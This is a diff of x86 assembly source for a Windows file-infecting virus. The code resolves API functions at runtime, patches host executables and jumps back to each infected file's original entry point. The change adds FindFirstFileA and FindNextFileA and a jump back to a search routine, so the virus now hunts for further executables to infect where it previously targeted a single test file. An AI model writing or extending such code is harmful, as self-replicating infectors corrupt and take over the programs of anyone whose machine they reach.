@@ -21,18 +21,20 @@ begin_copy:
     user32_dll_name         db "User32.dll", 0
     getProcAddress_name     db "GetProcAddress", 0
     loadLibrary_name        db "LoadLibraryA", 0
-	
+
 	file_name				db ".\test.exe", 0
 
 	dbg_sysfail				db "A system function failed", 0	; DEBUG
 	dbg_infectfail			db "Problem with an exe file", 0	; DEBUG
 
 ; Function names
-	closehandle_name		db "CloseHandle", 0	;
+	closehandle_name		db "CloseHandle", 0
 	createfile_name			db "CreateFileA", 0
-	getfilesize_name		db "GetFileSize", 0	;
+	findfirstfile_name		db "FindFirstFileA", 0
+	findnextfile_name		db "FindNextFileA", 0
+	getfilesize_name		db "GetFileSize", 0
     messagebox_name         db "MessageBoxA", 0
-	readfile_name			db "ReadFile", 0 ;
+	readfile_name			db "ReadFile", 0
 	setfilepointer_name		db "SetFilePointer", 0
     virtualalloc_name       db "VirtualAlloc", 0
 	writefile_name			db "WriteFile", 0
@@ -53,7 +55,6 @@ include		infect_file.asm
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 ; PROCEDURES - END
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
-
 
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
@@ -83,6 +84,8 @@ main PROC NEAR
 ; Function addresses
 	LOCAL	closehandle_addr:DWORD
 	LOCAL	createfile_addr:DWORD
+	LOCAL	findfirstfile_addr:DWORD
+	LOCAL	findnextfile_addr:DWORD
 	LOCAL	getfilesize_addr:DWORD
 	LOCAL	messagebox_addr:DWORD
 	LOCAL	readfile_addr:DWORD
@@ -193,6 +196,8 @@ ENDM
 	
 	LOADFUNC	closehandle_name,	kernel32_dll_name,	closehandle_addr
 	LOADFUNC	createfile_name,	kernel32_dll_name,	createfile_addr
+	LOADFUNC	findfirstfile_name,	kernel32_dll_name,	findfirstfile_addr
+	LOADFUNC	findnextfile_name,	kernel32_dll_name,	findnextfile_addr
 	LOADFUNC	getfilesize_name,	kernel32_dll_name,	getfilesize_addr
 	LOADFUNC	messagebox_name,	user32_dll_name,	messagebox_addr
 	LOADFUNC	readfile_name,		kernel32_dll_name,	readfile_addr
@@ -287,7 +292,7 @@ infect_dbg:										; DEBUG
 	push	filehandle
 	call	closehandle_addr			; We close the file because we are not pigs.
 
-	jmp		exit
+	jmp		exit_search_exe
 syserr:
 	push	0									; DEBUG
 	lea		ecx, [ebx + offset dbg_sysfail]		; DEBUG
@@ -296,15 +301,17 @@ syserr:
 	push	0									; DEBUG
 	call	messagebox_addr						; DEBUG
 
-exit:
+exit_search_exe:
+
+	jmp		search_exe
+
 	mov		ecx, [ebx + oldEntryPoint]
 	leave
-	jmp		ecx
-    ret
+	jmp		ecx							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.
 
+    ret
 main ENDP
 
-	leave
 end_copy:
 	ret
 end start
